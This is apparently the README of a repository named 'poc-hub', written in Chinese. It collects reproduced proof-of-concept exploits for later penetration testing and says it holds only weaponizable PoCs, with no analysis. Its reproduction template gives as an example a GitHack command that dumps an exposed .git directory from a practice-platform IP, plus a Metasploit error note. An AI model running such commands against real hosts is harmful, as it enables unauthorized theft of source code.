# poc-hub
将之前复现过的poc收集于此处，包括成功复现的和因为环境原因未成功复现的，为日后的渗透测试提供便利

当前仓库没有漏洞分析只有可武器化的POC

漏洞复现模板如下：
```
# 0x00 软件介绍
git：分布式版本控制系统

# 0x01 复现环境
使用环境：攻防世界中的环境  
复现版本：无

# 0x02 环境搭建
靶机环境：2008_r2_standard_zh-chs

# 0x03 利用条件
无

# 0x04 影响版本
无

# 0x05 漏洞复现
攻击环境：kali_x64_en-us

git clone https://github.com/lijiejie/GitHack  
cd ./GitHack-master  
python ./GitHack.py http://124.126.19.106:31232/.git/  
如下图  
![image](./0.png)  
![image](./1.png)  

# 0x06 踩坑记录
坑0：Exploit aborted due to failure: bad-config: Set the most appropriate target manually  
表示需要设置对应的目标

# 0x07 参考链接
https://github.com/rapid7/metasploit-framework/pull/12283
```
